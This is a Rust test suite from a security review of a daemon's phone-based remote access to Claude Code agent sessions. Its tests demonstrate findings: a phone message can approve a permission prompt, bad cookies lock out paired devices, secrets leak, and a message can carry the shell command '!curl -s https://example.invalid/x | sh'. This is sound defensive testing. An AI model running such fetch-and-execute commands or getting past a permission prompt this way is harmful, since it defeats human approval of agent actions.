//! Independent security review of remote access, step 1 (thread remote-review).
//!
//! Each test demonstrates a finding of `.sbxw-artifacts/reports/remote-review.md`,
//! or pins something the review checked. A test named `finding_*` PASSES while
//! the weakness exists: it asserts the behaviour the report objects to, so the
//! fix must turn it around. A test named `checked_*` pins a property that held.
//!
//! This file only compiles where the three remote branches are merged. To run
//! it, add `#[cfg(test)] mod remote_review_tests;` next to `mod remote_tests;`
//! in `crates/daemon/src/http/mod.rs`, then
//! `cargo test -j1 -p sbxw-daemon remote_review`.

use super::remote::{remote_router, ROUTES, REMOTE_PAGE};
use crate::app::App;
use crate::testing::app;
use axum::body::Body;
use axum::http::{header, HeaderMap, Method, Request, StatusCode};
use axum::Router;
use sbxw_core::remote_access::COOKIE;
use sbxw_core::session::SessionKey;
use sbxw_core::SandboxRef;
use serde_json::{json, Value};
use std::path::PathBuf;
use std::sync::Arc;
use std::time::Duration;
use tower::ServiceExt;

const TN: &str = "sbxw.tail1.ts.net";

fn on() -> (tempfile::TempDir, Arc<App>) {
    let (d, app) = app();
    app.remote_test_on(TN);
    (d, app)
}

struct Reply {
    status: StatusCode,
    #[allow(dead_code)]
    headers: HeaderMap,
    body: Vec<u8>,
}

impl Reply {
    fn json(&self) -> Value {
        serde_json::from_slice(&self.body).unwrap_or(Value::Null)
    }
    fn text(&self) -> String {
        String::from_utf8_lossy(&self.body).into_owned()
    }
}

/// A request as the sidecar forwards it, from tailnet peer `src`.
fn req(method: &str, path: &str, src: &str, cookie: Option<&str>) -> axum::http::request::Builder {
    let m: Method = method.parse().unwrap();
    let mut b = Request::builder().method(m.clone()).uri(path).header(header::HOST, TN).header("x-forwarded-for", src);
    if m != Method::GET && m != Method::HEAD {
        b = b.header(header::ORIGIN, format!("https://{TN}")).header(header::CONTENT_TYPE, "application/json");
    }
    if let Some(t) = cookie {
        b = b.header(header::COOKIE, format!("{COOKIE}={t}"));
    }
    b
}

async fn send(router: &Router, r: Request<Body>) -> Reply {
    let res = router.clone().oneshot(r).await.unwrap();
    let status = res.status();
    let headers = res.headers().clone();
    let body = match tokio::time::timeout(Duration::from_secs(3), axum::body::to_bytes(res.into_body(), 16 << 20)).await {
        Ok(b) => b.unwrap().to_vec(),
        Err(_) => b"(still streaming)".to_vec(),
    };
    Reply { status, headers, body }
}

async fn call(router: &Router, method: &str, path: &str, src: &str, cookie: Option<&str>, body: Value) -> Reply {
    let b = req(method, path, src, cookie);
    let body = if method == "GET" || method == "HEAD" { Body::empty() } else { Body::from(body.to_string()) };
    send(router, b.body(body).unwrap()).await
}

const PHONE: &str = "100.64.0.10";

async fn pair(app: &Arc<App>, router: &Router, name: &str) -> String {
    let code = app.remote_pairing_code().unwrap().code;
    let r = call(router, "POST", "/r/pair/start", PHONE, None, json!({ "code": code, "device_name": name })).await;
    assert_eq!(r.status, StatusCode::OK, "{}", r.text());
    let id = r.json()["request_id"].as_str().unwrap().to_string();
    assert!(app.remote_pairing_approve(&id));
    let r = call(router, "GET", &format!("/r/pair/status?request_id={id}"), PHONE, None, json!({})).await;
    assert_eq!(r.json()["state"], "paired", "{}", r.text());
    let cookie = r.headers[header::SET_COOKIE].to_str().unwrap().to_string();
    cookie[COOKIE.len() + 1..].split(';').next().unwrap().to_string()
}

/// A leader whose "terminal" records every byte typed into it.
async fn leader(app: &Arc<App>, dir: &std::path::Path, name: &str) -> (SandboxRef, PathBuf) {
    let sb = SandboxRef::parse(name).unwrap();
    let file = dir.join(format!("{name}.typed"));
    let script = format!("stty raw -echo 2>/dev/null; exec cat > '{}'", file.display());
    let (s, _) = app
        .sessions
        .get_or_open(&SessionKey::agent(&sb), 0, || async move { Ok(crate::pty::Spawn { program: "sh".into(), args: vec!["-c".into(), script], env: vec![] }) })
        .await
        .unwrap();
    app.leads.lock().unwrap().insert(sb.clone(), Arc::as_ptr(&s) as usize);
    hook(app, &sb, "s1", json!({"hook_event_name": "SessionStart"}));
    (sb, file)
}

fn hook(app: &App, sb: &SandboxRef, sid: &str, mut ev: Value) {
    ev["session_id"] = sid.into();
    ev["hook_version"] = 2.into();
    app.ingest_hook(sb, ev);
}

async fn typed(file: &std::path::Path, want: &[u8]) -> Vec<u8> {
    for _ in 0..80 {
        let got = std::fs::read(file).unwrap_or_default();
        if got.windows(want.len()).any(|w| w == want) {
            return got;
        }
        tokio::time::sleep(Duration::from_millis(100)).await;
    }
    std::fs::read(file).unwrap_or_default()
}

// ── F1 ───────────────────────────────────────────────────────────────────

/// F1. The leader shows a permission prompt (allow `git push`?). `answer` is
/// refused (409), as API.md 2.6 promises: "allowing a tool is an approval, and
/// step 1 has none from the phone". But `message` types into the very same
/// terminal, with a Return, whatever the leader waits for. In Claude Code's
/// permission dialog a digit picks an option and Return confirms the
/// highlighted one ("Yes" is first): the phone approves the tool.
#[tokio::test]
async fn finding_f1_a_message_is_typed_into_a_permission_prompt() {
    let (d, app) = on();
    let router = remote_router(app.clone());
    let token = pair(&app, &router, "phone").await;
    let (sb, file) = leader(&app, d.path(), "lead1").await;
    hook(&app, &sb, "s1", json!({"hook_event_name": "PreToolUse", "tool_name": "Bash", "tool_input": {"command": "git push --force"}}));
    hook(&app, &sb, "s1", json!({"hook_event_name": "Notification", "notification_type": "permission_prompt", "message": "Claude needs your permission to use Bash"}));
    let l = call(&router, "GET", "/r/leaders", PHONE, Some(&token), json!({})).await.json()["leaders"][0].clone();
    assert_eq!(l["asks"], true);
    assert_eq!(l["answerable"], false, "the daemon knows this prompt is not the phone's to answer");
    let r = call(&router, "POST", "/r/leaders/lead1/answer", PHONE, Some(&token), json!({"indices": [1]})).await;
    assert_eq!(r.status, StatusCode::CONFLICT, "answer is refused, as promised");

    // The same approval, through `message`.
    let r = call(&router, "POST", "/r/leaders/lead1/message", PHONE, Some(&token), json!({"text": "1"})).await;
    assert_eq!(r.status, StatusCode::OK, "FIXED? a message is now refused while a permission prompt is up: {}", r.text());
    let got = typed(&file, b"1\r").await;
    assert!(got.windows(2).any(|w| w == b"1\r"), "the option's digit and a Return reached the terminal: {got:?}");
}

// ── F2 ───────────────────────────────────────────────────────────────────

/// F2. Thirty requests with a made-up cookie, from any tailnet node that never
/// paired (or any local process), and every PAIRED device is refused (429) on
/// every route for the rest of the minute. Repeated each minute, the person is
/// locked out of remote access for as long as the attacker likes.
#[tokio::test]
async fn finding_f2_thirty_bad_cookies_lock_every_paired_device_out() {
    let (_d, app) = on();
    let router = remote_router(app.clone());
    let token = pair(&app, &router, "phone").await;
    assert_eq!(call(&router, "GET", "/r/me", PHONE, Some(&token), json!({})).await.status, StatusCode::OK);
    // One attacker node; it only has to vary the forwarded address if it is a
    // local process, and from the tailnet three nodes (10 each) are enough.
    for i in 0..30 {
        let src = format!("100.64.9.{}", i / 10);
        let _ = call(&router, "GET", "/r/me", &src, Some("sbxw_dev_made_up"), json!({})).await;
    }
    let r = call(&router, "GET", "/r/me", PHONE, Some(&token), json!({})).await;
    assert_eq!(r.status, StatusCode::TOO_MANY_REQUESTS, "FIXED? the paired phone, from its own address with its own good token, is no longer locked out: {}", r.text());
    let r = call(&router, "POST", "/r/leaders/x/interrupt", PHONE, Some(&token), json!({})).await;
    assert_eq!(r.status, StatusCode::TOO_MANY_REQUESTS, "not even Interrupt");
}

/// F2 (same root, pairing). Twenty `pair/start` with a wrong code and the
/// person's own phone, holding the right code, cannot start pairing.
#[tokio::test]
async fn finding_f2_twenty_wrong_codes_block_the_real_phone_from_pairing() {
    let (_d, app) = on();
    let router = remote_router(app.clone());
    let code = app.remote_pairing_code().unwrap().code;
    for i in 0..20 {
        let src = format!("100.64.9.{}", i / 5);
        let r = call(&router, "POST", "/r/pair/start", &src, None, json!({"code": "0".repeat(48), "device_name": "x"})).await;
        assert_eq!(r.status, StatusCode::FORBIDDEN);
    }
    let r = call(&router, "POST", "/r/pair/start", PHONE, None, json!({"code": code, "device_name": "my phone"})).await;
    assert_eq!(r.status, StatusCode::TOO_MANY_REQUESTS, "FIXED? {}", r.text());
}

// ── F3 ───────────────────────────────────────────────────────────────────

/// F3. A code leaked once (a photo of the screen, a shared terminal) is used by
/// someone else first. The person's phone is told "not valid", so the person
/// runs `sbxw remote pair` again. The new code does not void the stranger's
/// request, and the CLI shows `list.first()`: the stranger's request, under a
/// name the stranger chose, is what "A phone asks to pair" shows, at once,
/// before the real phone has opened the new link. Only the six digits stand
/// between a hurried `y` and a paired stranger.
#[tokio::test]
async fn finding_f3_a_new_code_keeps_the_older_request_and_the_cli_would_show_it_first() {
    let (_d, app) = on();
    let router = remote_router(app.clone());
    let leaked = app.remote_pairing_code().unwrap().code;
    let r = call(&router, "POST", "/r/pair/start", "100.64.6.6", None, json!({"code": leaked, "device_name": "iPhone"})).await;
    assert_eq!(r.status, StatusCode::OK);
    let strangers = r.json()["request_id"].as_str().unwrap().to_string();
    // The person tries again.
    let _second = app.remote_pairing_code().unwrap();
    let pending = app.remote_pairing_requests();
    assert_eq!(pending.len(), 1, "FIXED? a new code now voids earlier requests");
    assert_eq!(pending[0].id, strangers, "what `sbxw remote pair` would ask about is not the phone the new link was made for");
    // And approving it needs nothing that proves the digits were compared.
    assert!(app.remote_pairing_approve(&strangers));
    let r = call(&router, "GET", &format!("/r/pair/status?request_id={strangers}"), "100.64.6.6", None, json!({})).await;
    assert_eq!(r.json()["state"], "paired");
}

// ── F4 ───────────────────────────────────────────────────────────────────

/// F4. "No tool input and no tool result, ever" (API.md 2.4) holds for the
/// agent's tools, not for the output of a `!` shell command, of a slash
/// command, of a hook, or a task notification: those are `injected` items and
/// reach the phone whole. The anonymise rules mask the person's names and
/// secret shapes they know (a `ghp_` token is masked), not an AWS secret key,
/// a host name or an internal address.
#[tokio::test]
async fn finding_f4_shell_output_and_harness_text_reach_the_phone() {
    let (d, app) = on();
    let router = remote_router(app.clone());
    let token = pair(&app, &router, "phone").await;
    let (sb, _) = leader(&app, d.path(), "lead1").await;
    hook(&app, &sb, "s1", json!({"hook_event_name": "UserPromptSubmit", "prompt": "<bash-stdout>AWS_SECRET_ACCESS_KEY=wJalrXUtnFEMI/K7MDENG</bash-stdout>"}));
    hook(&app, &sb, "s1", json!({"hook_event_name": "UserPromptSubmit", "prompt": "<task-notification>result: contents of /etc/hosts: 10.0.0.5 internal-db</task-notification>"}));
    hook(&app, &sb, "s1", json!({"hook_event_name": "UserPromptSubmit", "prompt": "<local-command-stdout>token ghp_abcdefghijklmnopqrstuvwxyz0123456789</local-command-stdout>"}));
    let body = call(&router, "GET", "/r/leaders/lead1/history", PHONE, Some(&token), json!({})).await.text();
    for leak in ["AWS_SECRET_ACCESS_KEY=wJalrXUtnFEMI/K7MDENG", "10.0.0.5 internal-db"] {
        assert!(body.contains(leak), "FIXED? {leak} no longer reaches the phone: {body}");
    }
    assert!(!body.contains("ghp_abcdefghijklmnopqrstuvwxyz0123456789"), "a known token shape is masked");
}

// ── F5 ───────────────────────────────────────────────────────────────────

/// Every log line, as text.
#[derive(Clone, Default)]
struct Capture(Arc<std::sync::Mutex<String>>);

struct Fields<'a>(&'a mut String);

impl tracing::field::Visit for Fields<'_> {
    fn record_debug(&mut self, f: &tracing::field::Field, v: &dyn std::fmt::Debug) {
        use std::fmt::Write;
        let _ = write!(self.0, "{}={v:?} ", f.name());
    }
}

impl tracing::Subscriber for Capture {
    fn enabled(&self, _: &tracing::Metadata<'_>) -> bool {
        true
    }
    fn new_span(&self, _: &tracing::span::Attributes<'_>) -> tracing::span::Id {
        tracing::span::Id::from_u64(1)
    }
    fn record(&self, _: &tracing::span::Id, _: &tracing::span::Record<'_>) {}
    fn record_follows_from(&self, _: &tracing::span::Id, _: &tracing::span::Id) {}
    fn event(&self, e: &tracing::Event<'_>) {
        let mut line = String::new();
        e.record(&mut Fields(&mut line));
        let mut all = self.0.lock().unwrap();
        all.push_str(&line);
        all.push('\n');
    }
    fn enter(&self, _: &tracing::span::Id) {}
    fn exit(&self, _: &tracing::span::Id) {}
}

/// F5. API.md 7: "Never the text of a message, an answer or a transcription,
/// here or in any log line". The authors' log capture covers `message` only.
/// The answer a phone gives is logged at info by the shared `App::answer`.
#[tokio::test(flavor = "current_thread")]
async fn finding_f5_the_answer_a_phone_gives_is_logged() {
    let logs = Capture::default();
    let _guard = tracing::subscriber::set_default(logs.clone());
    let (d, app) = on();
    let router = remote_router(app.clone());
    let token = pair(&app, &router, "phone").await;
    let (sb, _) = leader(&app, d.path(), "lead1").await;
    hook(&app, &sb, "s1", json!({"hook_event_name": "PreToolUse", "tool_name": "AskUserQuestion",
        "tool_input": {"questions": [{"question": "Which way?", "options": [{"label": "Left"}, {"label": "Right"}, {"label": "Back"}]}]}}));
    let r = call(&router, "POST", "/r/leaders/lead1/answer", PHONE, Some(&token), json!({"indices": [3]})).await;
    assert_eq!(r.status, StatusCode::OK, "{}", r.text());
    let logged = logs.0.lock().unwrap().clone();
    assert!(logged.contains("indices=[3]"), "FIXED? the chosen option is no longer in the logs:\n{logged}");
}

// ── Checked and found sound ──────────────────────────────────────────────

/// The authors' list test compares PATHS. This one holds the METHODS: on every
/// path of the remote router, each of nine methods answers only where ROUTES
/// (or the page, GET and its HEAD) says so. A `.delete(...)` slipped onto an
/// existing path would fail here and not there.
#[tokio::test]
async fn checked_no_path_of_the_remote_router_answers_an_unlisted_method() {
    let (d, app) = on();
    let router = remote_router(app.clone());
    let token = pair(&app, &router, "phone").await;
    let _ = leader(&app, d.path(), "myapp").await;
    let mut paths: Vec<String> = ROUTES.iter().map(|(_, p)| p.to_string()).collect();
    paths.extend(REMOTE_PAGE.iter().map(|(p, _, _)| p.to_string()));
    paths.sort();
    paths.dedup();
    for path in &paths {
        let concrete = path.replace(":sandbox", "myapp");
        let query = if path == "/r/pair/status" { "?request_id=00" } else { "" };
        for method in ["GET", "HEAD", "POST", "PUT", "DELETE", "PATCH", "OPTIONS", "TRACE", "CONNECT"] {
            let listed = ROUTES.iter().any(|(m, p)| p == path && (*m == method || (*m == "GET" && method == "HEAD")))
                || (REMOTE_PAGE.iter().any(|(p, _, _)| p == path) && (method == "GET" || method == "HEAD"));
            if listed && path == "/r/logout" {
                continue; // would forget the device for the rest of the walk
            }
            let m: Method = method.parse().unwrap();
            let b = req(method, &format!("{concrete}{query}"), PHONE, Some(&token));
            let res = router.clone().oneshot(b.body(if m == Method::GET || m == Method::HEAD { Body::empty() } else { Body::from("{}") }).unwrap()).await.unwrap();
            let st = res.status();
            if listed {
                assert_ne!(st, StatusCode::METHOD_NOT_ALLOWED, "{method} {path}");
            } else {
                assert!(st == StatusCode::METHOD_NOT_ALLOWED || st == StatusCode::NOT_FOUND, "{method} {path} answered {st}");
                assert!(res.headers().get(header::ALLOW).is_none() || st == StatusCode::METHOD_NOT_ALLOWED);
            }
            for (k, _) in res.headers() {
                assert!(!k.as_str().starts_with("access-control-"), "{method} {path}: {k}");
            }
        }
    }
}

/// Method-override headers and a query `_method` change nothing; an
/// `Upgrade: websocket` on a data route is answered as plain HTTP.
#[tokio::test]
async fn checked_method_override_and_upgrade_do_nothing() {
    let (d, app) = on();
    let router = remote_router(app.clone());
    let token = pair(&app, &router, "phone").await;
    let (_sb, file) = leader(&app, d.path(), "lead1").await;
    for h in ["x-http-method-override", "x-http-method", "x-method-override"] {
        let b = req("GET", "/r/leaders/lead1/interrupt?_method=POST", PHONE, Some(&token)).header(h, "POST");
        let r = send(&router, b.body(Body::empty()).unwrap()).await;
        assert_eq!(r.status, StatusCode::METHOD_NOT_ALLOWED, "{h}");
    }
    let b = req("GET", "/r/me", PHONE, Some(&token)).header(header::UPGRADE, "websocket").header(header::CONNECTION, "upgrade").header("sec-websocket-key", "dGhlIHNhbXBsZSBub25jZQ==").header("sec-websocket-version", "13");
    let r = send(&router, b.body(Body::empty()).unwrap()).await;
    assert_eq!(r.status, StatusCode::OK, "plain HTTP");
    assert!(r.headers.get(header::UPGRADE).is_none());
    tokio::time::sleep(Duration::from_millis(200)).await;
    assert!(std::fs::read(&file).unwrap_or_default().is_empty(), "nothing typed");
}

/// A cookie alone is not enough to write: a cross-site POST (another origin,
/// `null`, or none) is refused before the token is looked at, on the tailnet
/// name and on loopback alike; and a device token in a bearer header, a query
/// or a differently named cookie is not a token.
#[tokio::test]
async fn checked_writes_need_the_pages_origin_and_the_cookie_is_the_only_carrier() {
    let (d, app) = on();
    let router = remote_router(app.clone());
    let token = pair(&app, &router, "phone").await;
    let (_sb, file) = leader(&app, d.path(), "lead1").await;
    for origin in [Some("https://evil.example"), Some("null"), Some("https://sbxw.tail1.ts.net.evil.example"), Some("https://SBXW.tail1.ts.net"), Some("https://sbxw.tail1.ts.net:443"), Some("http://sbxw.tail1.ts.net"), None] {
        let mut b = Request::builder().method("POST").uri("/r/leaders/lead1/interrupt").header(header::HOST, TN).header(header::CONTENT_TYPE, "application/json").header(header::COOKIE, format!("{COOKIE}={token}"));
        if let Some(o) = origin {
            b = b.header(header::ORIGIN, o);
        }
        let r = send(&router, b.body(Body::from("{}")).unwrap()).await;
        assert_eq!(r.status, StatusCode::FORBIDDEN, "{origin:?}");
    }
    for (name, value) in [(header::AUTHORIZATION, format!("Bearer {token}")), (header::COOKIE, format!("sbxw_device={token}")), (header::COOKIE, format!("x{COOKIE}={token}"))] {
        let b = req("GET", &format!("/r/me?token={token}&{COOKIE}={token}"), PHONE, None).header(name, value);
        assert_eq!(send(&router, b.body(Body::empty()).unwrap()).await.status, StatusCode::UNAUTHORIZED);
    }
    tokio::time::sleep(Duration::from_millis(200)).await;
    assert!(std::fs::read(&file).unwrap_or_default().is_empty(), "nothing typed");
}

/// Control characters in a message never reach the terminal: an ESC that would
/// close a paste, a CR that would be a Return, a CSI. One Return, at the end.
#[tokio::test]
async fn checked_a_message_cannot_smuggle_keys() {
    let (d, app) = on();
    let router = remote_router(app.clone());
    let token = pair(&app, &router, "phone").await;
    let (_sb, file) = leader(&app, d.path(), "lead1").await;
    let text = "hello\x1b[201~\r!id\x03\u{9b}A\u{7f} END";
    let r = call(&router, "POST", "/r/leaders/lead1/message", PHONE, Some(&token), json!({"text": text})).await;
    assert_eq!(r.status, StatusCode::OK, "{}", r.text());
    let got = typed(&file, b" END\r").await;
    assert_eq!(got.iter().filter(|b| **b == b'\r').count(), 1, "{got:?}");
    assert!(got.ends_with(b"\r"));
    for bad in [0x1bu8, 0x03, 0x7f] {
        assert!(!got.contains(&bad), "byte {bad:#x} in {got:?}");
    }
    assert!(!String::from_utf8_lossy(&got).contains('\u{9b}'));
}

/// A thread session of the leader's sandbox, and a sandbox that stopped
/// leading, are out of reach of message, answer, interrupt and history.
#[tokio::test]
async fn checked_only_the_leaders_main_session_is_reachable() {
    let (d, app) = on();
    let router = remote_router(app.clone());
    let token = pair(&app, &router, "phone").await;
    let (sb, file) = leader(&app, d.path(), "lead1").await;
    for name in ["lead1:worker", "lead1/worker", "lead1%2Fworker", "lead1.worker", "LEAD1", "lead1 ", "host:lead1"] {
        let p = format!("/r/leaders/{name}/interrupt");
        let Ok(uri) = p.parse::<axum::http::Uri>() else { continue };
        let b = Request::builder().method("POST").uri(uri).header(header::HOST, TN).header(header::ORIGIN, format!("https://{TN}")).header(header::CONTENT_TYPE, "application/json").header(header::COOKIE, format!("{COOKIE}={token}"));
        let r = send(&router, b.body(Body::from("{}")).unwrap()).await;
        assert_eq!(r.status, StatusCode::NOT_FOUND, "{name}: {}", r.text());
    }
    // Lead mode ends: the same sandbox is gone from the phone at once.
    app.leads.lock().unwrap().remove(&sb);
    for (m, p) in [("POST", "/r/leaders/lead1/message"), ("POST", "/r/leaders/lead1/interrupt"), ("POST", "/r/leaders/lead1/answer"), ("GET", "/r/leaders/lead1/history")] {
        let r = call(&router, m, p, PHONE, Some(&token), json!({"text": "hi", "indices": [1]})).await;
        assert!(r.status == StatusCode::NOT_FOUND || r.status == StatusCode::UNPROCESSABLE_ENTITY, "{m} {p}: {}", r.status);
    }
    tokio::time::sleep(Duration::from_millis(300)).await;
    assert!(std::fs::read(&file).unwrap_or_default().is_empty(), "nothing typed");
}

// ── F6 ───────────────────────────────────────────────────────────────────

/// F6. A message is whatever the person could type at the prompt: a `!` line
/// is a shell command Claude Code runs at once, with no permission prompt; a
/// `/` line is a slash command (`/permissions`, `/mcp`, `/config`, `/login`,
/// `/add-dir`...). Messages in a row, each ending in Return, drive the menus
/// those open. Nothing on the remote path refuses either. Level 3 says "raw
/// terminal input, MCP servers, configuration: never from a phone".
#[tokio::test]
async fn finding_f6_a_message_can_be_a_shell_or_slash_command() {
    let (d, app) = on();
    let router = remote_router(app.clone());
    let token = pair(&app, &router, "phone").await;
    let (_sb, file) = leader(&app, d.path(), "lead1").await;
    for (text, want) in [("!curl -s https://example.invalid/x | sh", &b"!curl -s https://example.invalid/x | sh\r"[..]), ("/permissions", &b"/permissions\r"[..])] {
        let r = call(&router, "POST", "/r/leaders/lead1/message", PHONE, Some(&token), json!({"text": text})).await;
        assert_eq!(r.status, StatusCode::OK, "FIXED? {text:?} is now refused: {}", r.text());
        let got = typed(&file, want).await;
        assert!(got.windows(want.len()).any(|w| w == want), "{text:?} typed with its Return: {got:?}");
    }
}
